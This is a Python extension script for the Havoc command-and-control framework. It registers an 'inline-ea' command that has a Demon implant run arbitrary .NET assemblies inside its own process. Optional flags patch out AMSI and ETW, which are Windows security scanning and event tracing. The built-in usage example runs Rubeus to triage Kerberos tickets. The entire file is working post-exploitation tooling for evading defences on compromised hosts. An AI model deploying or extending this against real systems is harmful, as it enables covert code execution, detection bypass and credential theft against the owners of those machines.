from havoc import Demon, RegisterCommand

def inline_ea( demonID, * param: tuple ):
    TaskID : str = None
    demon  : Demon = None
    packer : Packer = Packer()

    demon     = Demon( demonID )
    BOF_ENTRY = "go"
    BOF_NAME  = f"inline-ea.{ demon.ProcessArch }.o"

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute inline assembly" )

    if len( param ) < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid number of arguments" )
        return False

    PatchAmsi  = False
    PatchEtw   = False
    PatchExit  = False

    DotnetAssembly, *args = param
    DotnetArgumentsList   = []
    
    for arg in args:
        if arg == "--amsi":
            PatchAmsi = True
        elif arg == "--etw":
            PatchEtw = True
        elif arg == "--patchexit":
            PatchExit = True
        else:
            DotnetArgumentsList.append( arg )

    DotnetArguments = " ".join( DotnetArgumentsList )
    
    AssemblyBytes = b""
    with open( DotnetAssembly, "rb" ) as f:
        AssemblyBytes = f.read()
    
    AssemblyLength = len( AssemblyBytes )

    if not AssemblyBytes:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Failed to read assembly file" )
        return False

    # pack arguments
    packer.addbytes( AssemblyBytes )
    packer.addint( AssemblyLength )
    packer.addWstr( DotnetArguments )
    packer.addint( PatchExit )
    packer.addint( PatchAmsi )
    packer.addint( PatchEtw )
    
    BOF_PARAMS = packer.getbuffer()
    demon.InlineExecute(
        TaskID,
        BOF_ENTRY,
        BOF_NAME,
        BOF_PARAMS,
        False
    )

    return TaskID

RegisterCommand( inline_ea, "", "inline-ea", "Execute .NET assemblies in the current beacon process. All optional arguments must be at the end of the command.", 0, "/path/to/Assembly.exe [arguments...] [--patchexit] [--amsi] [--etw]", "/opt/SharpTools/NetFramework_4.0_x64/Rubeus.exe triage --amsi --etw --patchexit")